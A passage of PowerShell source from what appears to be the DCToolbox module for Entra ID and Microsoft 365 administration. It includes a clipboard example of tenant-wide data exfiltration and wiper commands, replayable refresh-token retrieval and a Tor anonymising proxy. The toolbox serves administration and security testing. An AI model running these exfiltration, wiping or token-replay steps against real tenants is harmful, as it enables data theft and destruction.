                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            8 {
                $Snippet = @'
# This script uses an Entra ID app registration to download all files from all M365 groups (Teams) document libraries in a tenant.

# One of the following Graph API app permissions is required:
# - Files.Read.All
# - Files.ReadWrite.All
# - Sites.Read.All
# - Sites.ReadWrite.All

# Simulate data exfiltration.
Invoke-DCM365DataExfiltration -ClientID '' -ClientSecret '' -TenantName 'COMPANY.onmicrosoft.com' -WhatIf

# Perform data exfiltration.
Invoke-DCM365DataExfiltration -ClientID '' -ClientSecret '' -TenantName 'COMPANY.onmicrosoft.com'


# This script uses an Entra ID app registration to wipe all files from all M365 groups (Teams) document libraries in a tenant.

# One of the following Graph API app permissions is required:
# - Files.ReadWrite.All
# - Sites.ReadWrite.All

# Simulate data deletion.
Invoke-DCM365DataWiper -ClientID '' -ClientSecret '' -TenantName 'COMPANY.onmicrosoft.com' -WhatIf

# Perform data deletion.
Invoke-DCM365DataWiper -ClientID '' -ClientSecret '' -TenantName 'COMPANY.onmicrosoft.com'

'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            100 {
                $Snippet = @'
# 
'@

                Set-Clipboard $Snippet

                Write-Host -ForegroundColor "Yellow" ""
                Write-Host -ForegroundColor "Yellow" "Example copied to clipboard!"
                Write-Host -ForegroundColor "Yellow" ""
            }
            0 {
                break 
            } default {
                break
            }
        }
    }
	

    # Create example menu.
    $Choice = CreateMenu -MenuTitle "Copy DCToolbox example to clipboard" -MenuChoices "Microsoft Graph with PowerShell examples", "Manage Conditional Access as code", "Activate an Entra ID Privileged Identity Management (PIM) role", "Manage stale Entra ID accounts", "Azure MFA SMS and voice call methods cleanup script", "General PowerShell script template", "Entra ID Security Breach Kick-Out Process", "Microsoft 365 Data Exfiltration / Wiper Attack"
    

    # Handle menu choice.
    HandleMenuChoice -MenuChoice $Choice
}



function Install-DCToolbox {
    <#
        .SYNOPSIS
            Check, install, and update the DCToolbox PowerShell module.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Install-DCToolbox

        .EXAMPLE
            Install-DCToolbox -Verbose
    #>


    [CmdletBinding()]
    param ()


    Write-Verbose -Message "Looking for DCToolbox PowerShell module..."

    $ModuleVersion = [string](Get-Module -ListAvailable -Name DCToolbox -Verbose:$false | Sort-Object Version -Descending | Select-Object -First 1).Version
    $LatestVersion = (Find-Module DCToolbox -Verbose:$false | Select-Object -First 1).Version
    
    if (!($ModuleVersion)) {
        Write-Verbose -Message "Not found! Installing DCToolbox $LatestVersion..."
        Install-Module DCToolbox -Scope CurrentUser -Force -Verbose:$false
        Write-Verbose -Message "Done!"
    } elseif ($ModuleVersion -ne $LatestVersion) {
        Write-Verbose -Message "Found DCToolbox $ModuleVersion. Upgrading to $LatestVersion..."
        Install-Module DCToolbox -Scope CurrentUser -Force -Verbose:$false
        Write-Verbose -Message "Done!"
    } else {
        Write-Verbose -Message "DCToolbox $ModuleVersion found!"
    }

    Remove-Module DCToolbox -Force -Verbose:$false

    Import-Module DCToolbox -Force -Verbose:$false -ErrorAction SilentlyContinue | Out-Null
}



function Confirm-DCPowerShellVersion {
    <#
        .SYNOPSIS
            Check that a supported PowerShell version is running.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Confirm-DCPowerShellVersion

        .EXAMPLE
            Confirm-DCPowerShellVersion -Verbose
    #>


    [CmdletBinding()]
    param ()


    Write-Verbose -Message "Checking PowerShell version..."
    if ($PSVersionTable.PSVersion.Major -lt 7) {
        Write-Error -Message "Please upgrade to PowerShell version 7 before running this command: https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.3"

        return
        exit
    } else {
        Write-Verbose -Message "PowerShell $($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor) found!"
    }
}



function Install-DCMicrosoftGraphPowerShellModule {
    <#
        .SYNOPSIS
            Check, install, and update the Microsoft Graph PowerShell module.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Install-DCMicrosoftGraphPowerShellModule

        .EXAMPLE
            Install-DCMicrosoftGraphPowerShellModule -Verbose
    #>


    [CmdletBinding()]
    param ()


    Write-Verbose -Message "Looking for the Graph PowerShell module..."

    $ModuleVersion = [string](Get-Module -ListAvailable -Name Microsoft.Graph.Authentication -Verbose:$false | Sort-Object Version -Descending | Select-Object -First 1).Version
    $LatestVersion = (Find-Module Microsoft.Graph.Authentication -Verbose:$false | Select-Object -First 1).Version

    if (!($ModuleVersion)) {
        Write-Verbose -Message "Not found! Installing Graph PowerShell module $LatestVersion..."
        Install-Module Microsoft.Graph -Scope CurrentUser -Force -Verbose:$false
        Write-Verbose -Message "Done!"
    } elseif ($ModuleVersion -ne $LatestVersion) {
        Write-Verbose -Message "Found Graph PowerShell module $ModuleVersion. Upgrading to $LatestVersion..."
        Install-Module Microsoft.Graph -Scope CurrentUser -Force -Verbose:$false
        Write-Verbose -Message "Done!"
    } else {
        Write-Verbose -Message "Graph PowerShell module $ModuleVersion found!"
    }

    Remove-Module Microsoft.Graph* -Force -Verbose:$false

    Import-Module Microsoft.Graph.Authentication -Force -Verbose:$false -ErrorAction SilentlyContinue | Out-Null
}



function Install-OutConsoleGridView {
    <#
        .SYNOPSIS
            Check, install, and update the Out-ConsoleGridView PowerShell module.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   
        
        .EXAMPLE
            Install-OutConsoleGridView

        .EXAMPLE
            Install-OutConsoleGridView -Verbose
    #>


    [CmdletBinding()]
    param ()


    Write-Verbose -Message "Looking for Out-ConsoleGridView PowerShell module..."

    $ModuleVersion = [string](Get-Module -ListAvailable -Name Microsoft.PowerShell.ConsoleGuiTools -Verbose:$false | Sort-Object Version -Descending | Select-Object -First 1).Version
    $LatestVersion = (Find-Module Microsoft.PowerShell.ConsoleGuiTools -Verbose:$false | Select-Object -First 1).Version
    
    if (!($ModuleVersion)) {
        Write-Verbose -Message "Not found! Installing Out-ConsoleGridView $LatestVersion..."
        Install-Module Microsoft.PowerShell.ConsoleGuiTools -Scope CurrentUser -Force -Verbose:$false
        Write-Verbose -Message "Done!"
    } elseif ($ModuleVersion -ne $LatestVersion) {
        Write-Verbose -Message "Found Out-ConsoleGridView $ModuleVersion. Upgrading to $LatestVersion..."
        Install-Module Microsoft.PowerShell.ConsoleGuiTools -Scope CurrentUser -Force -Verbose:$false
        Write-Verbose -Message "Done!"
    } else {
        Write-Verbose -Message "Out-ConsoleGridView $ModuleVersion found!"
    }

    Import-Module Microsoft.PowerShell.ConsoleGuiTools -Force -Verbose:$false -ErrorAction SilentlyContinue | Out-Null
}



function Connect-DCMsGraphAsUser {
    <#
        .SYNOPSIS
            Connect to Microsoft Graph with the Microsoft Graph PowerShell module as a user (using delegated permissions in Graph).

        .PARAMETER Scopes
            The required API permission scopes (delegated permissions). Example: "Policy.ReadWrite.ConditionalAccess", "Policy.Read.All"

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All'

        .EXAMPLE
            Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose
    #>


    [CmdletBinding()]
    param (
        [parameter(Mandatory = $true)]
        [string[]]$Scopes
    )


    # Authenticate to Microsoft Graph:
    Write-Verbose -Message "Connecting to Microsoft Graph..."

    Connect-MgGraph -NoWelcome -Scopes $Scopes -ErrorAction Stop
    
    Write-Verbose -Message "Connected to tenant '$(((Get-MgContext).Account.Split('@'))[1] )'!"
}



function Invoke-DCEntraIDDeviceAuthFlow {
    <#
        .SYNOPSIS
            Get a refresh token (or access token) from Entra ID using device code flow.

        .DESCRIPTION
            This CMDlet will start a device code flow authentication process in Entra ID. Go to the provided URL and enter the code to authenticate. The script will wait for the authentication and then return the refresh token, and also copy it to the clipboard.

            A refresh token fetched by this tool can be replayed on another device.
        
        .PARAMETER ShowTokenDetails
            Add this parameter if you want to display the token details on successful authentication.

        .PARAMETER ReturnAccessTokenInsteadOfRefreshToken
            Return an access token instead of a refresh token.

        .PARAMETER ClientID
            OPTIONAL: Specify the client ID for which a refresh token should be requested. Defaults to 'Microsoft Azure PowerShell' (1950a258-227b-4e31-a9cf-717495945fc2). If you set this parameter, you must also specify -TenantID. Note that the app registration in Entra ID must have device code flow enabled under Authentication > Advanced settings.

        .PARAMETER TenantID
            OPTIONAL: Specify your tenant ID. You only need to specify this if you're specifying a ClientID with -ClientID. This is because Microsoft needs to now in which tenant a specific app is located.
        
        .INPUTS
            None

        .OUTPUTS
            Entra ID Refresh Token

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Invoke-DCEntraIDDeviceAuthFlow

        .EXAMPLE
            $RefreshToken = Invoke-DCEntraIDDeviceAuthFlow

        .EXAMPLE
            Invoke-DCEntraIDDeviceAuthFlow -ShowTokenDetails

        .EXAMPLE
            Invoke-DCEntraIDDeviceAuthFlow -ClientID '' -TenantID ''
    #>


    param (
        [parameter(Mandatory = $false)]
        [switch]$ShowTokenDetails,

        [parameter(Mandatory = $false)]
        [switch]$ReturnAccessTokenInsteadOfRefreshToken,

        [parameter(Mandatory = $false)]
        [string]$ClientID = '1950a258-227b-4e31-a9cf-717495945fc2',

        [parameter(Mandatory = $false)]
        [string]$TenantID = 'common'
    )


    # STEP 1: Get a device authentication code to use in browser.
    $Headers=@{}
    $Headers["Content-Type"] = 'application/x-www-form-urlencoded'

    $body = @{
        "client_id" = $ClientID
        "scope" = "openid offline_access"
    }

    $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/devicecode" -Headers $Headers -Body $body

    Write-Host ""
    Write-Host -ForegroundColor Yellow "Go to this URL in any web browser:"
    Write-Host -ForegroundColor Cyan "   $($authResponse.verification_uri)"
    Write-Host ""
    Write-Host -ForegroundColor Yellow "Enter this code (it's in your clipboard):"
    $($authResponse.user_code) | Set-Clipboard
    Write-Host -ForegroundColor Cyan "   $($authResponse.user_code)"
    Write-Host ""


    # STEP 2: Wait for authentication to happen in browser, then get the refresh token and copy it to clipboard.
    Write-Host -ForegroundColor Yellow 'Waiting for browser sign-in...'

    for ($i = 0; $i -lt 60; $i++) {
        try {
            $body = @{
                "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"    
                "client_id" = $ClientID
                "device_code" = $authResponse.device_code
            }

            $Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" -Headers $Headers -Body $body

            Write-Host ""
            Write-Host -ForegroundColor Green "SUCCESS!"

            if ($ShowTokenDetails) {
                Write-Host ""
                Write-Host -ForegroundColor Yellow "*** Details ***"
                Write-Host -ForegroundColor Yellow "Token expires in: $([math]::Round($Tokens.expires_in / 60)) minutes"
                Write-Host -ForegroundColor Yellow "Scope: $($Tokens.scope)"
            }

            if ($ReturnAccessTokenInsteadOfRefreshToken) {
                Write-Host ""
                Write-Host -ForegroundColor Yellow "Access token:"

                Write-Output $Tokens.access_token
                Write-Host ""
                Write-Host -ForegroundColor Yellow "Access token was copied to clipboard!"
                Write-Host ""
                $Tokens.access_token | Set-Clipboard
            } else {
                Write-Host ""
                Write-Host -ForegroundColor Yellow "Refresh token:"

                Write-Output $Tokens.refresh_token
                Write-Host ""
                Write-Host -ForegroundColor Yellow "Refresh token was copied to clipboard!"
                Write-Host ""
                $Tokens.refresh_token | Set-Clipboard
            }
            
            return
        } catch {
            if (($_ | ConvertFrom-Json).error -eq 'code_expired') {
                Write-Host ""
                Write-Host -ForegroundColor Red 'Verification code expired!'
                Write-Host ""
                return
            } elseif (($_ | ConvertFrom-Json).error -eq 'authorization_pending') {
                Start-Sleep -Seconds 5
            } else {
                Write-Host ""
                Write-Host -ForegroundColor Red ($_ | ConvertFrom-Json).error
                Write-Host ""
                return
            }
        }
    }
    Write-Host ""
    Write-Host -ForegroundColor Red 'Verification code expired!'
    Write-Host ""
}



function Connect-DCMsGraphAsApplication {
    <#
        .SYNOPSIS
            Connect to Microsoft Graph with application credentials.

        .DESCRIPTION
            This CMDlet will automatically connect to Microsoft Graph using application permissions (as opposed to delegated credentials). If successfull an access token is returned that can be used with other Graph CMDlets. Make sure you store the access token in a variable according to the example.

            Before running this CMDlet, you first need to register a new application in your Entra ID according to this article:
            https://danielchronlund.com/2018/11/19/fetch-data-from-microsoft-graph-with-powershell-paging-support/
            
        .PARAMETER ClientID
            Client ID for your Entra ID application.

        .PARAMETER ClientSecret
            Client secret for the Entra ID application.

        .PARAMETER TenantName
            The name of your tenant (example.onmicrosoft.com).
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            $AccessToken = Connect-DCMsGraphAsApplication -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com'
    #>


    param (
        [parameter(Mandatory = $true)]
        [string]$ClientID,

        [parameter(Mandatory = $true)]
        [string]$ClientSecret,

        [parameter(Mandatory = $true)]
        [string]$TenantName
    )


    # Declarations.
    $LoginUrl = "https://login.microsoft.com"
    $ResourceUrl = "https://graph.microsoft.com"


    # Force TLS 1.2.
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    

    # Compose REST request.
    $Body = @{ grant_type = "client_credentials"; resource = $ResourceUrl; client_id = $ClientID; client_secret = $ClientSecret }
    $OAuth = Invoke-RestMethod -Method Post -Uri $LoginUrl/$TenantName/oauth2/token?api-version=1.0 -Body $Body
    

    # Return the access token.
    $OAuth.access_token
}



function Invoke-DCMsGraphQuery {
    <#
        .SYNOPSIS
            Run a Microsoft Graph query.

        .DESCRIPTION
            This CMDlet will run a query against Microsoft Graph and return the result. It will connect using an access token generated by Connect-DCMsGraphAsDelegated or Connect-DCMsGraphAsApplication (depending on what permissions you use in Graph).

            Before running this CMDlet, you first need to register a new application in your Entra ID according to this article:
            https://danielchronlund.com/2018/11/19/fetch-data-from-microsoft-graph-with-powershell-paging-support/
            
        .PARAMETER AccessToken
                An access token generated by Connect-DCMsGraphAsDelegated or Connect-DCMsGraphAsApplication (depending on what permissions you use in Graph).

        .PARAMETER GraphMethod
                The HTTP method for the Graph call, like GET, POST, PUT, PATCH, DELETE. Default is GET.

        .PARAMETER GraphUri
                The Microsoft Graph URI for the query. Example: https://graph.microsoft.com/v1.0/users/

        .PARAMETER GraphBody
                The request body of the Graph call. This is often used with methids like POST, PUT and PATCH. It is not used with GET.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri 'https://graph.microsoft.com/v1.0/users/'
    #>


    param (
        [parameter(Mandatory = $true)]
        [string]$AccessToken,

        [parameter(Mandatory = $false)]
        [string]$GraphMethod = 'GET',

        [parameter(Mandatory = $true)]
        [string]$GraphUri,

        [parameter(Mandatory = $false)]
        [string]$GraphBody = ''
    )

    # Check if authentication was successfull.
    if ($AccessToken) {
        # Format headers.
        $HeaderParams = @{
            'Content-Type'  = "application\json"
            'Authorization' = "Bearer $AccessToken"
        }


        # Create an empty array to store the result.
        $QueryRequest = @()
        $QueryResult = @()

        # Run the first query.
        if ($GraphMethod -eq 'GET') {
            $QueryRequest = Invoke-RestMethod -Headers $HeaderParams -Uri $GraphUri -UseBasicParsing -Method $GraphMethod -ContentType "application/json"
        }
        else {
            $QueryRequest = Invoke-RestMethod -Headers $HeaderParams -Uri $GraphUri -UseBasicParsing -Method $GraphMethod -ContentType "application/json" -Body $GraphBody
        }
        
        if ($QueryRequest.value) {
            $QueryResult += $QueryRequest.value
        }
        else {
            $QueryResult += $QueryRequest
        }


        # Invoke REST methods and fetch data until there are no pages left.
        if ($GraphUri -notlike "*`$top*") {
            while ($QueryRequest.'@odata.nextLink') {
                $QueryRequest = Invoke-RestMethod -Headers $HeaderParams -Uri $QueryRequest.'@odata.nextLink' -UseBasicParsing -Method $GraphMethod -ContentType "application/json"
    
                $QueryResult += $QueryRequest.value
            }
        }
        

        $QueryResult
    }
    else {
        Write-Error "No Access Token"
    }
}



function Enable-DCEntraIDPIMRole {
    <#
        .SYNOPSIS
            Activate an Entra ID Privileged Identity Management (PIM) role with PowerShell.

        .DESCRIPTION
            Uses the Graph PowerShell module to activate a user selected Entra ID role in Entra ID Privileged Identity Management (PIM).

            During activation, the user will be prompted to specify a reason for the activation.
        
        .PARAMETER RolesToActivate
            This parameter is optional but if you specify it, you can select multiple roles to activate at ones.

        .PARAMETER Reason
            Specify the reason for activating your roles.

        .PARAMETER UseMaximumTimeAllowed
            Use this switch to automatically request maximum allowed time for all role assignments.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Enable-DCEntraIDPIMRole

        .EXAMPLE
            Enable-DCEntraIDPIMRole -RolesToActivate 'Exchange Administrator', 'Security Reader'

        .EXAMPLE
            Enable-DCEntraIDPIMRole -RolesToActivate 'Exchange Administrator', 'Security Reader' -UseMaximumTimeAllowed

        .EXAMPLE
            Enable-DCEntraIDPIMRole -RolesToActivate 'Exchange Administrator', 'Security Reader' -Reason 'Performing some Exchange security configuration.' -UseMaximumTimeAllowed
    #>

    param (
        [parameter(Mandatory = $false)]
        [array]$RolesToActivate = @(),

        [parameter(Mandatory = $false)]
        [string]$Reason,

        [parameter(Mandatory = $false)]
        [switch]$UseMaximumTimeAllowed
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Check if the MSAL module is installed.
    if (Get-Module -ListAvailable -Name "msal.ps") {
        # Do nothing.
    } else {
        Write-Verbose -Verbose -Message 'Installing MSAL module...'
        Install-Package msal.ps -Force | Out-Null
    }


    # Check if already connected to Entra ID.
    if (!(Get-MgContext)) {
        # Try to force MFA challenge (since it is often required for PIM role activation).
        Write-Verbose -Verbose -Message 'Connecting to Entra ID...'

        # Get token for MS Graph by prompting for MFA.
        $MsResponse = Get-MsalToken -Scopes @('https://graph.microsoft.com/.default') -ClientId "14d82eec-204b-4c2f-b7e8-296a70dab67e" -RedirectUri "urn:ietf:wg:oauth:2.0:oob" -Authority 'https://login.microsoftonline.com/common' -Interactive -ExtraQueryParameters @{claims = '{"access_token" : {"amr": { "values": ["mfa"] }}}' }

        Connect-MgGraph -NoWelcome -AccessToken (ConvertTo-SecureString $MsResponse.AccessToken -AsPlainText -Force)
    }


    # Fetch current user object ID.
    $CurrentAccount = (Get-MgContext).Account
    Write-Verbose -Message "Fetching eligible roles for $CurrentAccount..."
    $CurrentAccountId = (Get-MgUser -Filter "UserPrincipalName eq '$CurrentAccount'").Id
    

    # Fetch all Entra ID roles.
    $EntraIDRoleTemplates = Get-MgDirectoryRoleTemplate | Select-Object DisplayName, Description, Id | Sort-Object DisplayName

    
    # Fetch all PIM role assignments for the current user.
    $EntraIDEligibleRoleAssignments = Get-MgRoleManagementDirectoryRoleEligibilitySchedule -ExpandProperty RoleDefinition -All -Filter "principalId eq '$CurrentAccountId'"


    # Exit if no roles are found.
    if ($EntraIDEligibleRoleAssignments.Count -eq 0) {
        Write-Verbose -Verbose -Message ''
        Write-Verbose -Verbose -Message 'Found no eligible PIM roles to activate :('
        return
    }

    # Format the fetched information.
    $CurrentAccountRoles = foreach ($RoleAssignment in $EntraIDEligibleRoleAssignments) {
        $CustomObject = New-Object -TypeName psobject
        $CustomObject | Add-Member -MemberType NoteProperty -Name 'RoleDefinitionId' -Value $RoleAssignment.RoleDefinitionId
        $CustomObject | Add-Member -MemberType NoteProperty -Name 'DisplayName' -Value ($EntraIDRoleTemplates | Where-Object { $_.Id -eq $RoleAssignment.RoleDefinitionId } ).DisplayName

        $PolicyAssignment = Get-MgPolicyRoleManagementPolicyAssignment -Filter "scopeId eq '/' and scopeType eq 'DirectoryRole' and roleDefinitionId eq '$($RoleAssignment.RoleDefinitionId)'" -ExpandProperty "policy(`$expand=rules)"

        # Get the role management policy that's been assigned:
        $Policy = Get-MgPolicyRoleManagementPolicy -UnifiedRoleManagementPolicyId $PolicyAssignment.PolicyId

        # Get all policy rules belonging to this role management policy:
        $PolicyRules = Get-MgPolicyRoleManagementPolicyRule -UnifiedRoleManagementPolicyId $Policy.Id

        $MaximumDuration = ($PolicyRules | where id -eq 'Expiration_EndUser_Assignment').AdditionalProperties.maximumDuration

        $CustomObject | Add-Member -MemberType NoteProperty -Name 'maximumGrantPeriodInHours' -Value ($MaximumDuration -replace 'PT', '' -replace 'H', '')
        $CustomObject | Add-Member -MemberType NoteProperty -Name 'StartDateTime' -Value $RoleAssignment.StartDateTime
        $CustomObject | Add-Member -MemberType NoteProperty -Name 'EndDateTime' -Value $RoleAssignment.EndDateTime
        $CustomObject
    }

    
    # Write menu title.
    Write-Host -ForegroundColor "Yellow" ""
    Write-Host -ForegroundColor "Yellow" "*** Activate PIM Role for $CurrentAccount ***"
    Write-Host -ForegroundColor "Yellow" ""
    Write-Host -ForegroundColor "Cyan" "Note: To switch account/tenant, run Disconnect-MgGraph first."
    Write-Host -ForegroundColor "Yellow" ""

    # Check if parameter was specified, and if that is true, enable all roles.
    if (!($RolesToActivate)) {
        # Create a menu and prompt the user for role selection.

        # Create a counter.
        $Counter = 1
        
        # Generate the menu choices.
        foreach ($DisplayName in $CurrentAccountRoles.DisplayName) {
            Write-Host -ForegroundColor "Yellow" "[$Counter] $DisplayName"
            
            # Add to counter.
            $Counter = $Counter + 1
        }
        Write-Host -ForegroundColor "Yellow" "[0] Exit"
        
        # Write empty line.
        Write-Host -ForegroundColor "Yellow" ""
        
        # Prompt user for input.
        $Prompt = "Choice"
        $Answer = Read-Host $Prompt

        # Exit if requested.
        if ($Answer -eq 0) {
            return
        }

        # Exit if nothing is selected.
        if ($Answer -eq '') {
            return
        }

        # Exit if no role is selected.
        if (!($CurrentAccountRoles[$Answer - 1])) {
            return
        }

        $RolesToActivate = @($CurrentAccountRoles[$Answer - 1])
    }
    else {
        Write-Host 'Roles to activate:'
        Write-Host ''

        $RolesToActivate = foreach ($Role in $RolesToActivate) {
            if ($CurrentAccountRoles.DisplayName -contains $Role) {
                Write-Host $Role
                $CurrentAccountRoles | Where-Object { $_.DisplayName -eq $Role }
            }
        }
    }

    # Prompt user for reason.
    Write-Host ''

    if (!($Reason)) {
        $Prompt = "Reason"
        $Reason = Read-Host $Prompt
    }


    foreach ($Role in $RolesToActivate) {
        # Check if PIM-role is already activated.
        $Duration = 0

        if ($UseMaximumTimeAllowed) {
            $Duration = ($Role.maximumGrantPeriodInHours)
        }
        else {
            # Prompt user for duration.
            if (!($Duration = Read-Host "Duration for '$($Role.DisplayName)' [$($Role.maximumGrantPeriodInHours) hour(s)]")) {
                $Duration = $Role.maximumGrantPeriodInHours
            }
        }


        # Activate PIM role.
        Write-Verbose -Verbose -Message "Activating PIM role '$($Role.DisplayName)'..."


        # Check for existing role activation before activating:
        $Result = ''
        $ExistingActivations = Get-MgRoleManagementDirectoryRoleAssignmentSchedule -Filter "PrincipalId eq '$CurrentAccountId' and RoleDefinitionId eq '$($Role.RoleDefinitionId)'"

        if ($ExistingActivations) {
            $params = @{
                "PrincipalId" = "$CurrentAccountId"
                "RoleDefinitionId" = "$($Role.RoleDefinitionId)"
                "DirectoryScopeId" = "/"
                "Action" = "SelfDeactivate"
            }
                
            $Result = New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -BodyParameter $params
        }

        $params = @{
            "PrincipalId" = "$CurrentAccountId"
            "RoleDefinitionId" = "$($Role.RoleDefinitionId)"
            "Justification" = "$Reason"
            "DirectoryScopeId" = "/"
            "Action" = "SelfActivate"
            "ScheduleInfo" = @{
                "StartDateTime" = Get-Date
                "Expiration" = @{
                    "Type" = "AfterDuration"
                    "Duration" = "PT$Duration`H"
                }
            }
        }
            
        $Result = New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -BodyParameter $params


        Write-Verbose -Verbose -Message "$($Role.DisplayName) has been activated until $(Get-Date -Format 'f' -Date ((Get-Date).AddHours($Duration)))!"
    }
}



function Get-DCPublicIp {
    <#
        .SYNOPSIS
            Get current public IP address information.

        .DESCRIPTION
            Get the current public IP address and related information. The ipinfo.io API is used to fetch the information. You can use the -UseTorHttpProxy to route traffic through a running Tor network HTTP proxy that was started by Start-DCTorHttpProxy.
            
        .PARAMETER UseTorHttpProxy
            Route traffic through a running Tor network HTTP proxy that was started by Start-DCTorHttpProxy.
            
        .INPUTS
            None

        .OUTPUTS
            Public IP address information.

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Get-DCPublicIp

        .EXAMPLE
            (Get-DCPublicIp).ip

        .EXAMPLE
            Write-Host "$((Get-DCPublicIp).city) $((Get-DCPublicIp).country)"
    #>


    param (
        [parameter(Mandatory = $false)]
        [switch]$UseTorHttpProxy
    )

    if ($UseTorHttpProxy) {
        Invoke-RestMethod -Proxy "http://127.0.0.1:9150" -Method "Get" -Uri "https://ipinfo.io/json"
    }
    else {
        Invoke-RestMethod -Method "Get" -Uri "https://ipinfo.io/json"
    }
}



function Start-DCTorHttpProxy {
    <#
        .SYNOPSIS
            Start a Tor network HTTP proxy for anonymous HTTP calls via PowerShell.

        .DESCRIPTION
            Start a Tor network HTTP proxy that can be used for anonymization of HTTP traffic in PowerShell. Requires proxy support in the PowerShell CMDlet you want to anonymise. Many of the tools included in DCToolbox supports this.

            Start the proxy:
            Start-DCTorHttpProxy

            The proxy will launch in a new PowerShell window that you can minimize.
            
            You can test it out (and find your currentn Tor IP address and location) with:
            Get-DCPublicIp -UseTorHttpProxy

            For other CMDlets, use the following proxy configuration:
            127.0.0.1:9150

            Note: This CMDlet expects the Tor browser to be installed under C:\Temp\Tor Browser. You can change the path with -TorBrowserPath.

            Download Tor browser:
            https://www.torproject.org/download/
            
        .PARAMETER TorBrowserPath
            The path to the Tor browser directory. Default is 'C:\Temp\Tor Browser'.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Start-DCTorHttpProxy
    #>


    param (
        [parameter(Mandatory = $false)]
        [string]$TorBrowserPath = 'C:\Temp\Tor Browser'
    )


    # Configuration
    $torBrowser = $TorBrowserPath
    $TOR_HOST = "127.0.0.1"
    $TOR_PORT = 9150
    $CTRL_PORT = 9151

    # Do not modify these
    $tor_location = "$torBrowser\Browser\TorBrowser\Tor"
    $torrc_defaults = "$torBrowser\Browser\TorBrowser\Data\Tor\torrc-defaults"
    $torrc = "$torBrowser\Browser\TorBrowser\Data\Tor\torrc"
    $tordata = "$torBrowser\Browser\TorBrowser\Data\Tor"
    $geoIP = "$torBrowser\Browser\TorBrowser\Data\Tor\geoip"
    $geoIPv6 = "$torBrowser\Browser\TorBrowser\Data\Tor\geoip6"
    $torExe = "$tor_location\tor.exe"
    $controllerProcess = $PID

    function Get-OneToLastItem {
        param ($arr) return $arr[$arr.Length - 2] 
    }

    $Command = "Write-Host '*** Running Tor HTTPS Proxy ***' -ForegroundColor Green; Write-Host ''; Write-Host 'Press [Ctrl+C] to stop Tor service.' -ForegroundColor Gray; Write-Host ''; & '$torExe' --defaults-torrc '$torrc_defaults' -f '$torrc' DataDirectory '$tordata' GeoIPFile '$geoIP' GeoIPv6File '$geoIPv6' +__ControlPort $CTRL_PORT +__HTTPTunnelPort '${TOR_HOST}:$TOR_PORT IPv6Traffic PreferIPv6 KeepAliveIsolateSOCKSAuth' __OwningControllerProcess $controllerProcess | more"

    try {
        Start-Process "`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`"" "-NoExit -Command $Command"

        Write-Host -ForegroundColor "Yellow" "Running Tor HTTPS Proxy on $TOR_HOST`:$TOR_PORT"
        Write-Host ""
    }
    catch {
        Write-Error -Message $PSItem.Exception.Message
    }
}



function Test-DCEntraIDUserExistence {
    <#
        .SYNOPSIS
            Test if an account exists in Entra ID for specified email addresses.
        
        .DESCRIPTION
